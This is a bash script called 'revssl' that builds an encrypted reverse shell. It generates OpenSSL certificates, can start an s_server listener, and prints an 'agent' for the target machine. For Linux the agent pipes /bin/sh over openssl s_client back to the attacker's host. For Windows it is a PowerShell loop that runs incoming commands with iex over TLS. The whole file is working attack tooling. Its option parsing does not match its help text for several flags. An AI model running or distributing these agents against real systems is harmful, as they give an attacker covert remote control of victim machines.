#!/bin/bash
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
blue=`tput setaf 4`
magenta=`tput setaf 5`
grey=`tput setaf 8`
reset=`tput sgr0`
bold=`tput bold`
underline=`tput smul`

sun="${red}o${reset}${yellow}O${reset}"

print_good(){
    echo "${green}[+]${reset}" $1
}
print_error(){
    echo "${red}[x]${reset}" $1
}
print_info(){
    echo "[*]" $1
}

listener=0
agent_file=0
remove_certs=0
encryption="rsa:4096"
lport=443
days=365
lhost=`ip address | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
key_name="key.pem"
cert_name="cert.pem"
platform="linux"
domain="domain.xyz"
agent_file_name="openssl_revshell"

print_usage(){
echo """		        _
                       | |
 _ __ _____   _____ ___| |
| '__/ _ \ \ / / __/ __| |
| | |  __/\ V /\__ \__ \ |
|_|  \___| \_/ |___/___/_|
"""
echo "Revssl ver. 1.0"
echo "Created by: TheSecondSun $sun"
echo
echo "usage: revssl [-h] [-i] [-e <encryption>] [-d <days>] [-l <lhost>]"
echo "	      [-p <lport>] [-k <keyname>] [-c <certname>] [-p <platform>]"
echo "	      [-o] [-n <outfile>] [-s <domain>] [-r]"
echo "options:"
echo " -h	Show help message"
echo " -i	Initiate listener in OpenSSL"
echo " -e <encryption>"
echo "	Choose encryption type (default: $encryption)"
echo " -d <days>"
echo "	Set certificates lifetime"
echo " -l <lhost>"
echo "	Set listening host (default: $lhost)"
echo " -p <port>"
echo "	Set listening port (default: $lport)"
echo " -k <keyname>"
echo "	Set name of generated key file (default: $key_name)"
echo " -c <certname>"
echo "	Set name of generated cert file (default: $cert_name)"
echo " -p <platform>"
echo "	Select agent platform (windows or linux, default: $platform)"
echo " -s <domain>"
echo "	Domain name for Windows Powershell agent (default: $domain)"
echo " -o	Write agent to a file"
echo " -n <outfile>"
echo "	Select name of the agent file (default: $agent_file_name)"
echo " -r	Remove generated certificates after established session"

}

while getopts "hie:p:l:d:a:on:" opt; do
    case "$opt" in
    h)
        print_usage
        exit 0
        ;;
    i)  listener=1
        ;;
    e)  encryption=$OPTARG
        ;;
    d)  days=$OPTARG
        ;;
	l) lhost=$OPTARG
		;;
	p) lport=$OPTARG
		;;
	k) key_name=$OPTARG
		;;
	c) cert_name=$OPTARG
		;;
	a) platform=$OPTARG
		;;
	o) agent_file=1
		;;
	n) agent_file_name=$OPTARG
		;;
	r) remove_certs=1
		;;
    esac
done

shift $((OPTIND-1))
[ "${1:-}" = "--" ] && shift

gen_cert_cmd="openssl req -x509 -newkey $encryption -keyout $key_name -out $cert_name -days $days -nodes"

listener_cmd="openssl s_server -quiet -key $key_name -cert $cert_name -port $lport"

linux_agent="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $lhost:$lport > /tmp/s; rm /tmp/s"

read -r -d '' windows_agent << EOL
\$socket = New-Object Net.Sockets.TcpClient('$lhost', $lport)
\$stream = \$socket.GetStream()
\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))
\$sslStream.AuthenticateAsClient('$domain')
\$writer = new-object System.IO.StreamWriter(\$sslStream)
\$writer.Write('PS ' + (pwd).Path + '> ')
\$writer.flush()
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)
{\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
\$sendback = (iex \$data | Out-String ) 2>&1;
\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
\$sslStream.Write(\$sendbyte,0,\$sendbyte.Length);\$sslStream.Flush()}
EOL

$gen_cert_cmd
echo
print_info "Generated certificates"
if [ "$platform" = "linux" ]; then
	agent=$linux_agent
else
	agent=$windows_agent
fi
print_info "Generated agent for $platform (execute it on target machine):"
echo "$agent"
echo
if [ $agent_file -eq 1 ]; then
	echo "$agent" > $agent_file_name
	print_info "Saved agent to $bold$agent_file_name$reset"
fi
if [ $listener -eq 1 ]; then
	print_good "Started listener on port $lport"
	$listener_cmd
fi
if [ $remove_certs -eq 1 ]; then
	rm $cert_name
	rm $key_name
	print_info "Removed keys and certificates"
fi
